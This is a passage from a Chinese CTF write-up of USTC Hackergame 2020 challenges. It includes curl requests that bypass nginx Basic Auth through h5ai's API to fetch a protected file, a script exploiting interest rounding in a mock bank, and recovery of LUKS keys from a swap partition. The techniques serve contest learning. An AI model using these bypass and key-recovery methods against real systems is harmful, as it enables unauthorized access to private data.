class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ <span class=\"hljs-built_in\">cat</span> flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ <span class=\"hljs-built_in\">chmod</span> +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>\"Send from Arctic.\" 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊......话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>......</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There's no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/20.png\" width=\"829\" height=\"601\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.0/32.png\" width=\"1067\" height=\"247\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/6.png\" width=\"1009\" height=\"593\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/7.png\" width=\"988\" height=\"581\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/13.png\" width=\"782\" height=\"905\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/15.png\" width=\"690\" height=\"94\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-title class_\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param</span> {<span class=\"hljs-type\">'credit'|'debit'</span>} <span class=\"hljs-variable\">type</span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) {    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-title class_\">JSON</span>.<span class=\"hljs-title function_\">stringify</span>({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param</span> {<span class=\"hljs-type\">Number</span>} <span class=\"hljs-variable\">from</span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param</span> {<span class=\"hljs-type\">Number</span>} <span class=\"hljs-variable\">to</span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param</span> {<span class=\"hljs-type\">Number</span>} <span class=\"hljs-variable\">amount</span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) {    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-title class_\">JSON</span>.<span class=\"hljs-title function_\">stringify</span>({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param</span> {<span class=\"hljs-type\">Number</span>} <span class=\"hljs-variable\">account</span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) {    <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-title class_\">JSON</span>.<span class=\"hljs-title function_\">stringify</span>({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">createCard</span>(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">createCard</span>(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">transfer</span>(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">eatAndEndTheDay</span>(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.<span class=\"hljs-title function_\">json</span>();    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(resp.<span class=\"hljs-property\">flag</span>);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">error</span>(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>......<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.8/29.png\" width=\"1497\" height=\"412\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完.....吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/27.png\" width=\"1150\" height=\"420\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/28.png\" width=\"1146\" height=\"539\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏......」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/18.png\" width=\"824\" height=\"864\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>...... 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 ... 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 ... 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-section\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-section\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-section\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  <span class=\"hljs-variable\">$document_root</span><span class=\"hljs-variable\">$fastcgi_script_name</span>;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ <span class=\"hljs-built_in\">cat</span> flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/9.png\" width=\"1165\" height=\"294\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/8.png\" width=\"750\" height=\"400\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 